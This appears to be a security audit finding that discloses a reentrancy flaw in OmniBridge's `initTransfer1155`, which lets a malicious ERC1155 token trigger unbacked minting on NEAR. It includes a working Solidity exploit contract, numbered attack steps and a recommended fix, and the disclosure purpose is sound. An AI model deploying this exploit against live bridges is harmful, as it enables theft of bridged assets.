### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Callback Enables Unauthorized NEAR-Side Minting Without Locking EVM Assets - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

### Summary
`OmniBridge.initTransfer1155` makes an external call to an attacker-controlled ERC1155 token contract (`IERC1155(tokenAddress).safeTransferFrom(...)`) before the function completes, with no reentrancy guard. A malicious ERC1155 token can re-enter `initTransfer1155` during `safeTransferFrom`, emitting multiple `InitTransfer` events from the legitimate OmniBridge contract without actually locking any ERC1155 tokens. The NEAR bridge, which trusts events emitted by the registered OmniBridge factory, will process each event and mint tokens on NEAR, resulting in unbacked minting.

### Finding Description
`initTransfer1155` accepts an arbitrary `tokenAddress` with no check that the token is a trusted or registered contract. The function:

1. Increments `currentOriginNonce` (state change)
2. Calls `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — an external call to an attacker-supplied contract
3. Calls `initTransferExtension` and emits `InitTransfer` [1](#0-0) 

There is no `nonReentrant` modifier on `initTransfer1155`. A malicious ERC1155 token's `safeTransferFrom` can call `bridge.initTransfer1155(...)` directly before returning, re-entering the function. Each re-entrant call increments `currentOriginNonce` and emits a new `InitTransfer` event. The malicious token never actually transfers any ERC1155 balance to the bridge.

The bridge's `onERC1155Received` guard (`operator != address(this)`) does not prevent this attack — the malicious token bypasses it by calling `initTransfer1155` directly rather than going through the standard ERC1155 callback path. [2](#0-1) 

`logMetadata1155`, which registers an ERC1155 token on the bridge and emits `LogMetadata` (causing the NEAR bridge to register the token), carries only a `whenNotPaused(PAUSED_DEPLOY_TOKEN)` guard with no role restriction, making it callable by any unprivileged user. [3](#0-2) 

### Impact Explanation
The NEAR bridge verifies `InitTransfer` events by checking that the emitter is a registered factory (the OmniBridge contract address). Since the events are genuinely emitted by OmniBridge, they pass prover verification. For each fraudulent `InitTransfer` event, the NEAR bridge mints tokens to the attacker's specified recipient on NEAR. No ERC1155 tokens are locked on EVM. This is a direct escrow mis-accounting / unauthorized minting impact: the attacker receives NEAR-side tokens backed by zero EVM-side collateral, draining the bridge's token supply integrity. [4](#0-3) 

### Likelihood Explanation
The attacker entry path is fully unprivileged:
1. Deploy a malicious ERC1155 contract.
2. Call `logMetadata1155(maliciousERC1155, tokenId)` — no role required.
3. Call `initTransfer1155(maliciousERC1155, tokenId, amount, 0, 0, recipient, "")`.
4. The malicious token's `safeTransferFrom` re-enters `initTransfer1155` N times, emitting N+1 `InitTransfer` events.
5. Submit proofs to the NEAR bridge for each event.

No admin compromise, no private key leak, and no off-chain collusion is required.

### Recommendation
Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply the `nonReentrant` modifier to `initTransfer1155` (and `initTransfer` for defense-in-depth):

```solidity
function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
```

Additionally, consider validating that `tokenAddress` is a registered ERC1155 token (present in `multiTokens`) before making the external call, to further restrict the attack surface.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import {IOmniBridge} from "./IOmniBridge.sol";

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    uint8 public reentryCount;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Called by bridge.initTransfer1155 → this.safeTransferFrom
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (reentryCount < 5) {
            reentryCount++;
            // Re-enter initTransfer1155 with nativeFee=0, fee=0
            bridge.initTransfer1155(
                address(this), tokenId, uint128(amount), 0, 0, "attacker.near", ""
            );
        }
        // Fake the onERC1155Received callback to satisfy the protocol
        IERC1155Receiver(msg.sender).onERC1155Received(
            msg.sender, address(this), tokenId, amount, ""
        );
    }

    // Minimal ERC1155 stubs
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridgeAddress)
// 2. bridge.logMetadata1155(maliciousERC1155, tokenId)  ← permissionless
// 3. bridge.initTransfer1155(maliciousERC1155, tokenId, 1e18, 0, 0, "attacker.near", "")
// Result: 6 InitTransfer events emitted, 0 ERC1155 tokens locked.
// NEAR bridge mints 6x tokens to attacker.near.
``` [5](#0-4) [6](#0-5)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L44-48)
```text
    mapping(uint64 => bool) public completedTransfers;
    uint64 public currentOriginNonce;

    mapping(address => address) public customMinters;
    mapping(address => MultiTokenInfo) public multiTokens;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L243-270)
```text
        MultiTokenInfo storage multiToken = multiTokens[deterministicToken];

        if (multiToken.tokenAddress == address(0)) {
            multiToken.tokenAddress = tokenAddress;
            multiToken.tokenId = tokenId;
        } else {
            if (
                multiToken.tokenAddress != tokenAddress ||
                multiToken.tokenId != tokenId
            ) {
                revert ERC1155MappingMismatch();
            }
        }

        logMetadataExtension(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );

        emit BridgeTypes.LogMetadata(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L439-490)
```text
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```
